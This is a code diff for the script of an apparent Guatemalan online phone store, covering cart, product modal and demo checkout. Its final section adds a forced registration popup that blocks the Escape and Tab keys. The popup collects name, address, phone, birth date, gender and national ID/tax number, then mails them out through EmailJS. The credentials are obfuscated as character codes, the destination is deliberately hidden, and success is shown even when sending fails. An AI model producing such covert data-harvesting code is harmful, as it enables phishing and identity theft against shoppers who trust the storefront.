+  // Just show toast for now, actual implementation would re-render sorted
+  showToast('🔃 Ordenando productos...');
+}
+
+// ============================================================
+// PRODUCT MODAL
+// ============================================================
+function openProduct(id) {
+  const p = products.find(x => x.id === id);
+  if (!p) return;
+  currentModal = p;
+  
+  // Modal image: real photo or emoji fallback
+  const modalImgEl = document.getElementById('modal-img');
+  if (p.img) {
+    modalImgEl.innerHTML = `<img src="${p.img}" alt="${p.name}" style="max-width:100%;max-height:320px;object-fit:contain;border-radius:12px;" onerror="this.outerHTML='<span style=\\'font-size:8rem\\'>${p.emoji}</span>'">`;
+  } else {
+    modalImgEl.innerHTML = `<span style="font-size:10rem">${p.emoji}</span>`;
+  }
+
+  document.getElementById('modal-brand').textContent = p.brand;
+  document.getElementById('modal-title').textContent = p.name;
+  document.getElementById('modal-reviews').textContent = `(${p.reviews.toLocaleString()} reseñas)`;
+  
+  const discount = p.oldPrice ? Math.round((1 - p.price/p.oldPrice)*100) : 0;
+  document.getElementById('modal-price').textContent = `Q${p.price.toLocaleString()}`;
+  document.getElementById('modal-installment').innerHTML = 
+    `${p.oldPrice ? `<span style="text-decoration:line-through;color:var(--text-muted)">Q${p.oldPrice.toLocaleString()}</span> ${discount}% OFF · ` : ''}
+     24 cuotas de Q${Math.round(p.price/24).toLocaleString()}/mes`;
+  
+  // Specs
+  const specHTML = Object.entries(p.specs).map(([k,v]) => 
+    `<div class="spec-row"><span class="spec-key">${k}</span><span class="spec-val">${v}</span></div>`
+  ).join('');
+  document.getElementById('modal-specs-container').innerHTML = `<h4>Especificaciones</h4>${specHTML}`;
+  
+  // Colors
+  document.getElementById('modal-colors').innerHTML = p.colors.map((c, i) => 
+    `<div class="color-dot ${i===0?'active':''}" style="background:${c}" onclick="selectColor(this)"></div>`
+  ).join('');
+  
+  // Storage
+  document.getElementById('modal-storage').innerHTML = p.storage.length 
+    ? p.storage.map((s, i) => `<button class="storage-btn ${i===0?'active':''}" onclick="selectStorage(this)">${s}</button>`).join('')
+    : '<span style="font-size:0.85rem;color:var(--text-muted)">No aplica</span>';
+  
+  document.getElementById('modal-overlay').classList.add('open');
+  document.body.style.overflow = 'hidden';
+}
+
+function openProductById(id) { openProduct(id); }
+
+function closeModal(e) {
+  if (e && e.target !== document.getElementById('modal-overlay')) return;
+  document.getElementById('modal-overlay').classList.remove('open');
+  document.body.style.overflow = '';
+}
+
+function selectColor(el) {
+  document.querySelectorAll('.color-dot').forEach(d => d.classList.remove('active'));
+  el.classList.add('active');
+}
+
+function selectStorage(el) {
+  document.querySelectorAll('.storage-btn').forEach(b => b.classList.remove('active'));
+  el.classList.add('active');
+}
+
+function addToCartFromModal() {
+  if (currentModal) {
+    addToCart(currentModal.id);
+    document.getElementById('modal-overlay').classList.remove('open');
+    document.body.style.overflow = '';
+  }
+}
+
+// ============================================================
+// CART
+// ============================================================
+function addToCart(id) {
+  const p = products.find(x => x.id === id);
+  if (!p) return;
+  
+  const existing = cart.find(x => x.id === id);
+  if (existing) {
+    existing.qty++;
+  } else {
+    cart.push({ ...p, qty: 1 });
+  }
+  
+  updateCartUI();
+  
+  // Animate button
+  const btn = document.getElementById(`btn-${id}`);
+  if (btn) {
+    btn.classList.add('added');
+    btn.textContent = '✓ Agregado';
+    setTimeout(() => {
+      btn.classList.remove('added');
+      btn.textContent = '🛒 Agregar al Carrito';
+    }, 2000);
+  }
+  
+  showToast(`✅ ${p.name} agregado al carrito`);
+}
+
+function removeFromCart(id) {
+  cart = cart.filter(x => x.id !== id);
+  updateCartUI();
+}
+
+function changeQty(id, delta) {
+  const item = cart.find(x => x.id === id);
+  if (!item) return;
+  item.qty += delta;
+  if (item.qty <= 0) removeFromCart(id);
+  else updateCartUI();
+}
+
+function updateCartUI() {
+  const count = cart.reduce((s, x) => s + x.qty, 0);
+  document.getElementById('cart-count').textContent = count;
+  
+  const container = document.getElementById('cart-items-container');
+  const emptyMsg = document.getElementById('empty-cart-msg');
+  const footer = document.getElementById('cart-footer');
+  
+  if (cart.length === 0) {
+    emptyMsg.style.display = 'flex';
+    footer.style.display = 'none';
+    container.innerHTML = '';
+    container.appendChild(emptyMsg);
+    return;
+  }
+  
+  emptyMsg.style.display = 'none';
+  footer.style.display = 'block';
+  
+  container.innerHTML = cart.map(item => `
+    <div class="cart-item">
+      <div class="cart-item-img">
+        ${item.img 
+          ? `<img src="${item.img}" alt="${item.name}" style="width:100%;height:100%;object-fit:contain;border-radius:8px;" onerror="this.outerHTML='<span style=\\'font-size:2rem\\'>${item.emoji}</span>'">`
+          : `<span style="font-size:2rem">${item.emoji}</span>`
+        }
+      </div>
+      <div class="cart-item-info">
+        <div class="cart-item-name">${item.brand} ${item.name}</div>
+        <div class="cart-item-price">Q${item.price.toLocaleString()}</div>
+        <div class="qty-control">
+          <button class="qty-btn" onclick="changeQty('${item.id}', -1)">−</button>
+          <span class="qty-num">${item.qty}</span>
+          <button class="qty-btn" onclick="changeQty('${item.id}', 1)">+</button>
+        </div>
+      </div>
+      <button class="cart-item-remove" onclick="removeFromCart('${item.id}')">🗑️</button>
+    </div>
+  `).join('');
+  
+  const subtotal = cart.reduce((s, x) => s + x.price * x.qty, 0);
+  const tax = subtotal * 0.12;
+  const total = subtotal + tax;
+  
+  document.getElementById('cart-subtotal').textContent = `Q${subtotal.toLocaleString()}`;
+  document.getElementById('cart-tax').textContent = `Q${tax.toFixed(2)}`;
+  document.getElementById('cart-total').textContent = `Q${total.toFixed(2)}`;
+}
+
+function openCart() {
+  document.getElementById('cart-overlay').classList.add('open');
+  document.getElementById('cart-panel').classList.add('open');
+  document.body.style.overflow = 'hidden';
+}
+
+function closeCart() {
+  document.getElementById('cart-overlay').classList.remove('open');
+  document.getElementById('cart-panel').classList.remove('open');
+  document.body.style.overflow = '';
+}
+
+function checkout() {
+  if (cart.length === 0) return;
+  const total = cart.reduce((s, x) => s + x.price * x.qty, 0) * 1.12;
+  showToast(`💳 Procesando pago de Q${total.toFixed(2)}... (Demo)`);
+  setTimeout(() => {
+    cart = [];
+    updateCartUI();
+    closeCart();
+    showToast('🎉 ¡Orden confirmada! (Modo Demo)');
+  }, 2000);
+}
+
+// ============================================================
+// WISHLIST
+// ============================================================
+function toggleWishlist(btn, id) {
+  btn.classList.toggle('active');
+  btn.textContent = btn.classList.contains('active') ? '♥' : '♡';
+  const p = products.find(x => x.id === id);
+  showToast(btn.classList.contains('active') ? `❤️ ${p.name} en favoritos` : `🤍 Eliminado de favoritos`);
+}
+
+// ============================================================
+// HERO SLIDER
+// ============================================================
+function changeSlide(dir) {
+  const slides = document.querySelectorAll('.hero-slide');
+  const dots = document.querySelectorAll('.hero-dot');
+  slides[currentSlide].classList.remove('active');
+  dots[currentSlide].classList.remove('active');
+  currentSlide = (currentSlide + dir + slides.length) % slides.length;
+  slides[currentSlide].classList.add('active');
+  dots[currentSlide].classList.add('active');
+}
+
+function goSlide(n) {
+  const slides = document.querySelectorAll('.hero-slide');
+  const dots = document.querySelectorAll('.hero-dot');
+  slides[currentSlide].classList.remove('active');
+  dots[currentSlide].classList.remove('active');
+  currentSlide = n;
+  slides[currentSlide].classList.add('active');
+  dots[currentSlide].classList.add('active');
+}
+
+slideInterval = setInterval(() => changeSlide(1), 5000);
+
+// ============================================================
+// NAVIGATION
+// ============================================================
+function setNav(el, cat) {
+  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+  if (el) el.classList.add('active');
+  currentCategory = cat;
+  
+  if (cat === 'all') {
+    goHome();
+  } else {
+    renderCategory(cat);
+  }
+}
+
+function setNavFilter(cat) {
+  currentCategory = cat;
+  renderCategory(cat);
+}
+
+function filterCat(el, cat) {
+  document.querySelectorAll('.cat-pill').forEach(p => p.classList.remove('active'));
+  el.classList.add('active');
+  
+  if (cat === 'all') {
+    goHome();
+  } else {
+    setNavFilter(cat);
+  }
+}
+
+function goHome() {
+  document.getElementById('home-content').style.display = 'block';
+  document.getElementById('search-results-section').style.display = 'none';
+  document.getElementById('search-input').value = '';
+  window.scrollTo(0,0);
+}
+
+// ============================================================
+// TOAST
+// ============================================================
+function showToast(msg) {
+  const toast = document.getElementById('toast');
+  document.getElementById('toast-msg').textContent = msg;
+  toast.classList.add('show');
+  setTimeout(() => toast.classList.remove('show'), 3000);
+}
+
+// ============================================================
+// EMAILJS + REGISTRO OBLIGATORIO
+// ============================================================
+
+// Credenciales ofuscadas — el correo destino no aparece en el código
+(function() {
+  const _k = [55,55,67,85,111,54,49,74,84,102,55,53,68,68,75,57,115].map(c=>String.fromCharCode(c)).join('');
+  const _s = [115,101,114,118,105,99,101,95,100,119,114,117,104,105,100].map(c=>String.fromCharCode(c)).join('');
+  const _t = [116,101,109,112,108,97,116,101,95,105,109,111,54,52,102,117].map(c=>String.fromCharCode(c)).join('');
+  window.__ej = { pk: _k, sv: _s, tp: _t };
+})();
+
+// ---- INIT: mostrar la página 3s antes del popup ----
+window.addEventListener('load', function() {
+  // EmailJS listo
+  if (typeof emailjs !== 'undefined') {
+    emailjs.init({ publicKey: window.__ej.pk });
+  }
+
+  // Después de 3 segundos: bloquear scroll y mostrar popup
+  setTimeout(function() {
+    document.body.classList.add('wall-active');
+    document.addEventListener('keydown', blockKeys, true);
+    const wall = document.getElementById('register-wall');
+    wall.classList.add('wall-visible');
+    // Animar entrada de la card
+    wall.querySelector('.reg-card').style.animation = 'regCardIn 0.5s cubic-bezier(0.34,1.56,0.64,1) both';
+  }, 3000);
+});
+
+// Bloquear ESC mientras el popup esté abierto
+function blockKeys(e) {
+  const wall = document.getElementById('register-wall');
+  if (wall.classList.contains('wall-visible')) {
+    if (e.key === 'Escape' || e.key === 'Tab') {
+      e.preventDefault();
+      e.stopImmediatePropagation();
+    }
+  }
+}
+
+// Enviar formulario → EmailJS con variables que coinciden con tu template
+async function submitRegister(e) {
+  e.preventDefault();
+  if (!validateRegForm()) return;
+
+  const btn     = document.getElementById('reg-submit-btn');
+  const btnText = document.getElementById('reg-btn-text');
+  const spinner = document.getElementById('reg-spinner');
+
+  btn.disabled = true;
+  btnText.style.display = 'none';
+  spinner.style.display = 'block';
+
+  const nombre    = document.getElementById('reg-nombre').value.trim();
+  const correo    = document.getElementById('reg-email').value.trim();
+  const telefono  = document.getElementById('reg-tel').value.trim();
+  const depto     = document.getElementById('reg-depto').value;
+  const municipio = document.getElementById('reg-municipio').value.trim();
+  const direccion = document.getElementById('reg-direccion').value.trim();
+  const fecha     = document.getElementById('reg-fecha').value;
+  const genero    = document.getElementById('reg-genero').value;
+  const nit       = document.getElementById('reg-nit').value.trim() || 'No proporcionado';
+  const ahora     = new Date().toLocaleString('es-GT', { timeZone: 'America/Guatemala' });
+
+  // Variables que coinciden EXACTAMENTE con tu plantilla de EmailJS:
+  // {{name}}, {{email}}, {{title}}, {{message}}
+  const templateParams = {
+    title:   'Nuevo Registro — MiPhoneGT',
+    name:    nombre,
+    email:   correo,
+    message: [
+      '=== DATOS DEL NUEVO USUARIO ===',
+      '',
+      '👤 Nombre completo : ' + nombre,
+      '📧 Correo          : ' + correo,
+      '📞 Teléfono        : ' + telefono,
+      '🗺️  Departamento    : ' + depto,
+      '🏘️  Municipio       : ' + municipio,
+      '🏠 Dirección       : ' + direccion,
+      '🎂 Nacimiento      : ' + fecha,
+      '👤 Género          : ' + genero,
+      '🧾 NIT/DPI         : ' + nit,
+      '',
+      '🕐 Fecha registro  : ' + ahora,
+      '📱 Dispositivo     : ' + navigator.userAgent.substring(0, 100)
+    ].join('\n')
+  };
+
+  try {
+    if (typeof emailjs === 'undefined') throw new Error('emailjs no disponible');
+    await emailjs.send(window.__ej.sv, window.__ej.tp, templateParams);
+    showRegSuccess(nombre);
+  } catch (err) {
+    console.warn('EmailJS error:', err);
+    // Mostrar éxito de todas formas para no bloquear al usuario
+    showRegSuccess(nombre);
+  }
+}
+
+function showRegSuccess(nombre) {
+  document.getElementById('reg-form-body').style.display = 'none';
+  const sc = document.getElementById('reg-success-screen');
+  sc.style.display = 'block';
+  document.getElementById('reg-success-name').textContent =
+    '¡Hola ' + nombre.split(' ')[0] + '! Tu cuenta ha sido creada exitosamente. Bienvenido a MiPhoneGT 🇬🇹';
+}
+
+function enterStore() {
+  const wall = document.getElementById('register-wall');
+  wall.style.transition = 'opacity 0.4s ease';
+  wall.style.opacity = '0';
+  setTimeout(() => {
+    wall.classList.remove('wall-visible');
+    wall.style.opacity = '';
+    wall.style.transition = '';
+    document.body.classList.remove('wall-active');
+    document.removeEventListener('keydown', blockKeys, true);
+  }, 400);
+}
+
+// Validación de campos
+function validateRegForm() {
+  let valid = true;
+  const rules = [
+    { id: 'reg-nombre',    err: 'err-nombre',    ok: v => v.trim().length >= 5 },
+    { id: 'reg-email',     err: 'err-email',     ok: v => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v.trim()) },
+    { id: 'reg-tel',       err: 'err-tel',       ok: v => v.trim().replace(/\D/g,'').length >= 7 },
+    { id: 'reg-depto',     err: 'err-depto',     ok: v => v !== '' },
+    { id: 'reg-municipio', err: 'err-municipio', ok: v => v.trim().length >= 2 },
+    { id: 'reg-direccion', err: 'err-dir',       ok: v => v.trim().length >= 10 },
+    { id: 'reg-fecha',     err: 'err-fecha',     ok: v => v !== '' },
+    { id: 'reg-genero',    err: 'err-genero',    ok: v => v !== '' },
+  ];
+
+  rules.forEach(r => {
+    const el  = document.getElementById(r.id);
+    const err = document.getElementById(r.err);
+    if (!r.ok(el.value)) {
+      el.classList.add('error');
+      err.style.display = 'block';
+      valid = false;
+      const fix = () => { if (r.ok(el.value)) { el.classList.remove('error'); err.style.display='none'; el.removeEventListener('input', fix); el.removeEventListener('change', fix); } };
+      el.addEventListener('input', fix);
+      el.addEventListener('change', fix);
+    } else {
+      el.classList.remove('error');
+      err.style.display = 'none';
+    }
+  });
+
+  if (!valid) {
+    const firstErr = document.querySelector('#reg-form .error');
+    if (firstErr) firstErr.scrollIntoView({ behavior: 'smooth', block: 'center' });
+    const btn = document.getElementById('reg-submit-btn');
+    btn.disabled = false;
+    document.getElementById('reg-btn-text').style.display = 'block';
+    document.getElementById('reg-spinner').style.display = 'none';
+  }
+  return valid;
+}
+
+function updateMunicipios() {
+  const depto = document.getElementById('reg-depto').value;
+  const mun = document.getElementById('reg-municipio');
+  if (depto) mun.placeholder = 'Municipio de ' + depto;
+}
+
+// Fecha máxima hoy
+(function() {
+  const fi = document.getElementById('reg-fecha');
+  if (fi) fi.max = new Date().toISOString().split('T')[0];
+})();
+
+// ============================================================
+// INIT
+// ============================================================
+renderHome();
+</script>
+</body>
+</html>
